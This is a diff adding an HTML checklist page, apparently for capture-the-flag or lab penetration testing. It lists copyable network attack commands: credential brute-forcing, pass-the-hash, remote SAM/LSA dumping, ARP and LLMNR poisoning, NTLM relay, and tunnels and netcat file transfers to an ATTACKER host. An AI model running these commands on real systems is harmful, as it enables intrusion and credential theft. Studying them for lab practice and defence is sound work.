@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Attack Cheatsheet</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:monospace;font-size:14px;background:#1a1a1a;color:#e0e0e0;padding:20px}
+h1{font-size:20px;margin-bottom:4px;color:#fff}
+.sub{color:#888;font-size:12px;margin-bottom:16px}
+.breadcrumb{font-size:10px;color:#444;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:16px}
+.breadcrumb a{color:#4ade80;text-decoration:none}
+.breadcrumb a:hover{text-decoration:underline}
+.trow{display:flex;align-items:center;gap:8px;background:#2a2a2a;border:1px solid #444;border-radius:6px;padding:8px 12px;margin-bottom:8px}
+.trow label{color:#4ade80;font-size:12px;white-space:nowrap;min-width:50px}
+.trow input{flex:1;background:transparent;border:none;color:#e0e0e0;font-family:monospace;font-size:13px;outline:none}
+.pbg{background:#333;border-radius:4px;height:6px;margin-bottom:4px}
+.pfill{background:#4ade80;height:6px;border-radius:4px;transition:width 0.3s}
+.ptxt{color:#888;font-size:11px;margin-bottom:16px}
+.filters{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}
+.fb{background:#2a2a2a;border:1px solid #444;color:#888;padding:4px 10px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:11px}
+.fb:hover{color:#e0e0e0;border-color:#666}
+.fb.active{color:#4ade80;border-color:#4ade80;background:#1a2e1a}
+.rb{background:#2a2a2a;border:1px solid #444;color:#888;padding:4px 10px;border-radius:4px;cursor:pointer;font-family:monospace;font-size:11px;margin-left:auto}
+.rb:hover{color:#f87171;border-color:#f87171}
+.phase{border:1px solid #333;border-radius:6px;margin-bottom:10px;overflow:hidden}
+.ph{display:flex;align-items:center;gap:10px;padding:10px 14px;background:#222;cursor:pointer;user-select:none}
+.ph:hover{background:#2a2a2a}
+.pnum{font-size:10px;color:#666;min-width:24px}
+.pname{flex:1;font-size:13px;font-weight:bold}
+.pprog{font-size:11px;color:#888}
+.parr{font-size:10px;color:#666;transition:transform 0.2s;display:inline-block}
+.parr.open{transform:rotate(90deg)}
+.pb{display:none;border-top:1px solid #333}
+.pb.open{display:block}
+.item{display:flex;align-items:flex-start;gap:10px;padding:8px 14px;border-bottom:1px solid #2a2a2a;cursor:pointer}
+.item:last-child{border-bottom:none}
+.item:hover{background:#222}
+.item.done{opacity:0.4}
+.chk{width:14px;height:14px;border:1px solid #555;border-radius:3px;flex-shrink:0;margin-top:2px;display:flex;align-items:center;justify-content:center;font-size:10px;color:transparent}
+.item.done .chk{background:#4ade80;border-color:#4ade80;color:#000}
+.ib{flex:1;min-width:0}
+.itop{display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.itxt{font-size:12px}
+.item.done .itxt{text-decoration:line-through;color:#666}
+.badge{font-size:9px;padding:1px 5px;border-radius:3px;font-weight:bold;flex-shrink:0}
+.bh{background:#3b1a1a;color:#f87171;border:1px solid #5a2a2a}
+.bm{background:#2e2a14;color:#fbbf24;border:1px solid #4a4020}
+.bl{background:#1a1e2e;color:#60a5fa;border:1px solid #2a3050}
+.cb{margin-top:5px}
+.cmd{display:inline-block;font-family:monospace;font-size:10px;color:#aaa;background:#111;border:1px solid #333;border-radius:3px;padding:3px 7px;cursor:pointer;word-break:break-all;max-width:100%}
+.cmd:hover{color:#4ade80;border-color:#4ade80}
+.nw{padding:8px 14px;border-top:1px solid #2a2a2a;background:#111}
+.nl{font-size:9px;color:#555;text-transform:uppercase;letter-spacing:0.08em;margin-bottom:4px}
+.nw textarea{width:100%;background:#1a1a1a;border:1px solid #333;border-radius:4px;color:#ccc;font-family:monospace;font-size:11px;padding:6px 8px;resize:vertical;min-height:40px;outline:none}
+.nw textarea:focus{border-color:#4ade80}
+.toast{position:fixed;bottom:20px;right:20px;background:#1a2e1a;border:1px solid #4ade80;color:#4ade80;font-size:11px;font-family:monospace;padding:7px 14px;border-radius:5px;opacity:0;pointer-events:none;transition:opacity 0.2s;z-index:999}
+.toast.on{opacity:1}
+</style>
+</head>
+<body>
+
+<div class="breadcrumb">
+  <a href="../../index.html">Home</a> &rsaquo;
+  <a href="../index.html">CheatSheets</a> &rsaquo;
+  Network Attack
+</div>
+
+<h1>Network Attack Cheatsheet</h1>
+<p class="sub">Check items as you go &mdash; progress saved in browser localStorage</p>
+
+<div class="trow"><label>IP &rarr;</label><input type="text" id="target-ip" placeholder="10.10.x.x"></div>
+<div class="trow"><label>URL &rarr;</label><input type="text" id="target-url" placeholder="http://target.ctf"></div>
+
+<div class="pbg"><div class="pfill" id="pf" style="width:0%"></div></div>
+<div class="ptxt" id="pt">0 / 0 completed</div>
+
+<div class="filters">
+  <button class="fb active" id="f-all">All</button>
+  <button class="fb" id="f-todo">Todo</button>
+  <button class="fb" id="f-done">Done</button>
+  <button class="fb" id="f-high">Critical only</button>
+  <button class="rb" id="btn-reset">Reset</button>
+</div>
+
+<div id="root"></div>
+<div class="toast" id="toast">Copied!</div>
+
+<script>
+var D = [
+  {id:"recon",num:"01",name:"Reconnaissance",items:[
+    {t:"Full TCP port scan",p:"high",c:"nmap -sV -sC -p- --min-rate 5000 -oN nmap_tcp.txt IP"},
+    {t:"UDP top 200 ports",p:"high",c:"nmap -sU --top-ports 200 -oN nmap_udp.txt IP"},
+    {t:"Service version detection on found ports",p:"high",c:"nmap -sV -sC -p PORTS IP"},
+    {t:"OS detection",p:"med",c:"nmap -O IP"},
+    {t:"Aggressive scan (OS + version + scripts + traceroute)",p:"med",c:"nmap -A -oN nmap_aggressive.txt IP"},
+    {t:"Network sweep to discover live hosts",p:"med",c:"nmap -sn 10.10.10.0/24 -oG hosts_alive.txt"},
+    {t:"Firewall and packet filter detection",p:"low",c:"nmap -sA IP"},
+    {t:"NSE vuln scripts scan",p:"med",c:"nmap --script vuln -oN nmap_vuln.txt IP"}
+  ]},
+  {id:"smb",num:"02",name:"SMB (445 / 139)",items:[
+    {t:"Enumerate shares and permissions",p:"high",c:"smbclient -L //IP -N && smbmap -H IP"},
+    {t:"Connect to a share anonymously",p:"high",c:"smbclient //IP/SHARE -N"},
+    {t:"Enumerate users, groups, policies via RPC",p:"high",c:"enum4linux-ng -A IP"},
+    {t:"Check for EternalBlue MS17-010",p:"high",c:"nmap --script smb-vuln-ms17-010 -p 445 IP"},
+    {t:"Check for SMBGhost CVE-2020-0796",p:"high",c:"nmap --script smb-vuln-cve-2020-0796 -p 445 IP"},
+    {t:"Brute-force SMB credentials",p:"med",c:"crackmapexec smb IP -u users.txt -p passwords.txt"},
+    {t:"Pass-the-Hash via SMB",p:"high",c:"crackmapexec smb IP -u USER -H HASH"},
+    {t:"Execute command via SMB if admin",p:"high",c:"crackmapexec smb IP -u USER -p PASS -x whoami"},
+    {t:"Dump SAM and LSA secrets remotely",p:"high",c:"crackmapexec smb IP -u USER -p PASS --sam --lsa"},
+    {t:"Spider share content recursively",p:"med",c:"smbmap -H IP -R SHARE --depth 5"}
+  ]},
+  {id:"ftp",num:"03",name:"FTP (21)",items:[
+    {t:"Test anonymous login",p:"high",c:"ftp IP"},
+    {t:"Download all files as anonymous",p:"high",c:"wget -m --no-passive ftp://anonymous:anonymous@IP"},
+    {t:"Brute-force FTP credentials",p:"med",c:"hydra -l USER -P /usr/share/wordlists/rockyou.txt ftp://IP"},
+    {t:"Check FTP banner for version info",p:"low",c:"nc -nv IP 21"},
+    {t:"Test for FTP bounce attack",p:"low",c:"nmap --script ftp-bounce -p 21 IP"},
+    {t:"Check for writeable directories",p:"med",c:"ftp IP  # login then try: put test.txt in each directory"}
+  ]},
+  {id:"ssh",num:"04",name:"SSH (22)",items:[
+    {t:"Banner grab and version check",p:"med",c:"nc -nv IP 22"},
+    {t:"Enumerate supported authentication methods",p:"med",c:"ssh -v USER@IP 2>&1 | grep authentications"},
+    {t:"Brute-force SSH credentials",p:"high",c:"hydra -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP"},
+    {t:"Check for weak SSH host keys",p:"low",c:"ssh-audit IP"},
+    {t:"Connect with credentials or private key",p:"high",c:"ssh USER@IP  or  ssh -i id_rsa USER@IP"},
+    {t:"Local port forwarding to internal service",p:"med",c:"ssh -L 8080:127.0.0.1:80 USER@IP"},
+    {t:"Dynamic SOCKS proxy via SSH",p:"med",c:"ssh -D 1080 USER@IP"}
+  ]},
+  {id:"dns",num:"05",name:"DNS (53)",items:[
+    {t:"DNS zone transfer attempt",p:"high",c:"dig axfr @IP domain.com"},
+    {t:"Reverse DNS lookup",p:"med",c:"dig -x IP @IP"},
+    {t:"Enumerate all DNS record types",p:"high",c:"dig any domain.com @IP"},
+    {t:"Subdomain brute-force",p:"high",c:"gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r IP"},
+    {t:"DNS cache snooping",p:"low",c:"nmap --script dns-cache-snoop -p 53 IP"},
+    {t:"Check for open DNS resolver",p:"low",c:"nmap --script dns-recursion -p 53 IP"}
+  ]},
+  {id:"snmp",num:"06",name:"SNMP (161 UDP)",items:[
+    {t:"Detect SNMP and brute community strings",p:"high",c:"onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt IP"},
+    {t:"Walk full SNMP tree with public community",p:"high",c:"snmpwalk -v2c -c public IP"},
+    {t:"Enumerate users via SNMP OID",p:"high",c:"snmpwalk -v2c -c public IP 1.3.6.1.4.1.77.1.2.25"},
+    {t:"Enumerate running processes via SNMP",p:"med",c:"snmpwalk -v2c -c public IP 1.3.6.1.2.1.25.4.2.1.2"},
+    {t:"Enumerate open TCP ports via SNMP",p:"med",c:"snmpwalk -v2c -c public IP 1.3.6.1.2.1.6.13.1.3"}
+  ]},
+  {id:"ldap",num:"07",name:"LDAP (389 / 636)",items:[
+    {t:"Anonymous LDAP bind and base enumeration",p:"high",c:"ldapsearch -x -H ldap://IP -b '' -s base namingContexts"},
+    {t:"Dump all objects from base DN",p:"high",c:"ldapsearch -x -H ldap://IP -b 'DC=domain,DC=com'"},
+    {t:"Enumerate users",p:"high",c:"ldapsearch -x -H ldap://IP -b 'DC=domain,DC=com' '(objectClass=person)'"},
+    {t:"Enumerate groups",p:"med",c:"ldapsearch -x -H ldap://IP -b 'DC=domain,DC=com' '(objectClass=group)'"},
+    {t:"Authenticated LDAP enumeration",p:"med",c:"ldapsearch -x -H ldap://IP -D 'CN=USER,DC=domain,DC=com' -w PASS -b 'DC=domain,DC=com'"}
+  ]},
+  {id:"rdp",num:"08",name:"RDP (3389)",items:[
+    {t:"Check if RDP is open and get encryption info",p:"high",c:"nmap -p 3389 --script rdp-enum-encryption IP"},
+    {t:"Brute-force RDP credentials",p:"high",c:"hydra -l USER -P /usr/share/wordlists/rockyou.txt rdp://IP"},
+    {t:"Check for BlueKeep CVE-2019-0708",p:"high",c:"nmap --script rdp-vuln-ms12-020 -p 3389 IP"},
+    {t:"Connect with valid credentials",p:"high",c:"xfreerdp /u:USER /p:PASS /v:IP /dynamic-resolution"},
+    {t:"Pass-the-Hash via RDP Restricted Admin mode",p:"high",c:"xfreerdp /u:USER /pth:HASH /v:IP /cert-ignore"}
+  ]},
+  {id:"pivot",num:"09",name:"Pivoting and Tunneling",items:[
+    {t:"Static port forward with chisel",p:"high",c:"# Attacker: chisel server -p 8000 --reverse  |  Victim: chisel client ATTACKER:8000 R:8080:127.0.0.1:80"},
+    {t:"SOCKS5 proxy with chisel",p:"high",c:"# Attacker: chisel server -p 8000 --reverse --socks5  |  Victim: chisel client ATTACKER:8000 R:1080:socks"},
+    {t:"SSH local port forwarding",p:"high",c:"ssh -L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT USER@IP"},
+    {t:"SSH remote port forwarding",p:"med",c:"ssh -R REMOTE_PORT:127.0.0.1:LOCAL_PORT USER@IP"},
+    {t:"SSH dynamic SOCKS proxy",p:"high",c:"ssh -D 1080 USER@IP"},
+    {t:"Route traffic through pivot with proxychains",p:"high",c:"proxychains nmap -sT -Pn TARGET_INTERNAL"},
+    {t:"Ligolo-ng agent pivot setup",p:"med",c:"# Attacker: ./proxy -selfcert -laddr 0.0.0.0:11601  |  Victim: ./agent -connect ATTACKER:11601 -ignore-cert"},
+    {t:"Simple TCP relay with netcat and fifo",p:"low",c:"mkfifo /tmp/f && nc -lvnp 4444 < /tmp/f | nc INTERNAL_HOST 80 > /tmp/f"}
+  ]},
+  {id:"mitm",num:"10",name:"MITM and Poisoning",items:[
+    {t:"ARP poisoning to intercept LAN traffic",p:"high",c:"arpspoof -i eth0 -t TARGET_IP GATEWAY_IP"},
+    {t:"Responder to capture NetNTLM hashes",p:"high",c:"responder -I eth0 -wrf"},
+    {t:"LLMNR and NBT-NS poisoning with Responder",p:"high",c:"responder -I eth0 -A"},
+    {t:"Relay captured hashes with ntlmrelayx",p:"high",c:"ntlmrelayx.py -tf targets.txt -smb2support"},
+    {t:"SSL stripping with bettercap",p:"med",c:"bettercap -iface eth0 -eval 'net.probe on; arp.spoof on; https.proxy on'"},
+    {t:"Crack captured NetNTLMv2 hashes",p:"high",c:"hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt"}
+  ]},
+  {id:"postexploit",num:"11",name:"Post-Exploitation",items:[
+    {t:"Identify local network interfaces and routes",p:"high",c:"ip a && ip route && cat /etc/hosts"},
+    {t:"Discover internal hosts from pivot point",p:"high",c:"nmap -sn 10.10.10.0/24 --min-rate 5000"},
+    {t:"Scan internal network via proxychains",p:"high",c:"proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24"},
+    {t:"Dump ARP table for known live hosts",p:"med",c:"arp -a && ip neigh"},
+    {t:"Capture traffic on interface",p:"med",c:"tcpdump -i eth0 -w capture.pcap"},
+    {t:"Extract credentials from pcap",p:"med",c:"tcpdump -r capture.pcap -A | grep -iE pass|user|login|auth"},
+    {t:"Transfer files via netcat",p:"high",c:"# Receiver: nc -lvnp 4444 > file  |  Sender: nc ATTACKER 4444 < file"}
+  ]}
+];
+
+var state={done:{},notes:{},filter:"all",collapsed:{}};
+var currentIP="";
+var currentURL="";
+
+function save(){try{localStorage.setItem("ctf_net",JSON.stringify({done:state.done,notes:state.notes}))}catch(e){}}
+function load(){try{var s=JSON.parse(localStorage.getItem("ctf_net")||"{}");if(s.done)state.done=s.done;if(s.notes)state.notes=s.notes}catch(e){}}
+function sk(pid,t){return pid+"|||"+t}
+function mk(tag,cls,txt){var e=document.createElement(tag);if(cls)e.className=cls;if(txt!==undefined)e.textContent=txt;return e}
+function toast(){var t=document.getElementById("toast");t.classList.add("on");setTimeout(function(){t.classList.remove("on")},1500)}
+function copy(txt){if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(toast).catch(function(){fb(txt)})}else{fb(txt)}}
+function fb(txt){var ta=document.createElement("textarea");ta.value=txt;ta.style.cssText="position:fixed;opacity:0;top:0;left:0";document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand("copy");toast()}catch(e){}document.body.removeChild(ta)}
+function resolveCmd(cmd){
+  var ip=currentIP||"IP";
+  var url=currentURL||"URL";
+  var urlHost=url.replace(/^https?:\/\//,"").replace(/\/.*$/,"");
+  return cmd.replace(/URL_HOST/g,urlHost).replace(/URL/g,url).replace(/IP/g,ip);
+}
+function updateProg(){
+  var total=0,done=0;
+  D.forEach(function(ph){ph.items.forEach(function(it){total++;if(state.done[sk(ph.id,it.t)])done++})});
+  var pct=total?Math.round(done/total*100):0;
+  document.getElementById("pf").style.width=pct+"%";
+  document.getElementById("pt").textContent=done+" / "+total+" completed ("+pct+"%)";
+}
+function render(){
+  var root=document.getElementById("root");
+  root.innerHTML="";
+  D.forEach(function(phase){
+    var isOpen=!state.collapsed[phase.id];
+    var pdone=0;
+    phase.items.forEach(function(it){if(state.done[sk(phase.id,it.t)])pdone++});
+    var vis=phase.items.filter(function(it){
+      var k=sk(phase.id,it.t);
+      if(state.filter==="done")return!!state.done[k];
+      if(state.filter==="todo")return!state.done[k];
+      if(state.filter==="high")return it.p==="high";
+      return true;
+    });
+    if(state.filter!=="all"&&vis.length===0)return;
+    var wrap=mk("div","phase");
+    var hdr=mk("div","ph");
+    hdr.appendChild(mk("span","pnum",phase.num));
+    hdr.appendChild(mk("span","pname",phase.name));
+    hdr.appendChild(mk("span","pprog",pdone+"/"+phase.items.length));
+    var arr=mk("span","parr"+(isOpen?" open":""),"\u25B6");
+    hdr.appendChild(arr);
+    hdr.addEventListener("click",(function(pid){return function(){state.collapsed[pid]=!state.collapsed[pid];render()}})(phase.id));
+    wrap.appendChild(hdr);
+    var body=mk("div","pb"+(isOpen?" open":""));
+    vis.forEach(function(item){
+      var key=sk(phase.id,item.t);
+      var done=!!state.done[key];
+      var row=mk("div","item"+(done?" done":""));
+      row.appendChild(mk("div","chk",done?"\u2713":""));
+      var ib=mk("div","ib");
+      var top=mk("div","itop");
+      top.appendChild(mk("span","itxt",item.t));
+      top.appendChild(mk("span","badge "+(item.p==="high"?"bh":item.p==="med"?"bm":"bl"),item.p==="high"?"critical":item.p==="med"?"medium":"low"));
+      ib.appendChild(top);
+      if(item.c){
+        var cw=mk("div","cb");
+        var resolved=resolveCmd(item.c);
+        var ce=mk("span","cmd",resolved);
+        ce.title="Click to copy";
+        ce.addEventListener("click",(function(txt){return function(e){e.stopPropagation();copy(txt)}})(resolved));
+        cw.appendChild(ce);
+        ib.appendChild(cw);
+      }
+      row.appendChild(ib);
+      row.addEventListener("click",(function(key){return function(){state.done[key]=!state.done[key];save();render()}})(key));
+      body.appendChild(row);
+    });
+    var nw=mk("div","nw");
+    nw.appendChild(mk("div","nl","// notes - "+phase.name.toLowerCase()));
+    var ta=document.createElement("textarea");
+    ta.placeholder="Findings, open ports, credentials, notes...";
+    ta.value=state.notes[phase.id]||"";
+    ta.addEventListener("click",function(e){e.stopPropagation()});
+    ta.addEventListener("input",(function(pid){return function(){state.notes[pid]=this.value;save()}})(phase.id));
+    nw.appendChild(ta);
+    body.appendChild(nw);
+    wrap.appendChild(body);
+    root.appendChild(wrap);
+  });
+  updateProg();
+}
+function setFilter(f){
+  state.filter=f;
+  document.querySelectorAll(".fb").forEach(function(b){b.classList.remove("active")});
+  document.getElementById("f-"+f).classList.add("active");
+  render();
+}
+document.getElementById("f-all").addEventListener("click",function(){setFilter("all")});
+document.getElementById("f-todo").addEventListener("click",function(){setFilter("todo")});
+document.getElementById("f-done").addEventListener("click",function(){setFilter("done")});
+document.getElementById("f-high").addEventListener("click",function(){setFilter("high")});
+document.getElementById("btn-reset").addEventListener("click",function(){
+  if(!confirm("Reset all progress and notes?"))return;
+  state.done={};state.notes={};save();render();
+});
+var tiIP=document.getElementById("target-ip");
+var tiURL=document.getElementById("target-url");
+try{tiIP.value=localStorage.getItem("ctf_ip")||""}catch(e){}
+try{tiURL.value=localStorage.getItem("ctf_url")||""}catch(e){}
+currentIP=tiIP.value.trim();
+currentURL=tiURL.value.trim();
+tiIP.addEventListener("input",function(){currentIP=this.value.trim();try{localStorage.setItem("ctf_ip",currentIP)}catch(e){}render()});
+tiURL.addEventListener("input",function(){currentURL=this.value.trim();try{localStorage.setItem("ctf_url",currentURL)}catch(e){}render()});
+load();render();
+</script>
+</body>
+</html>
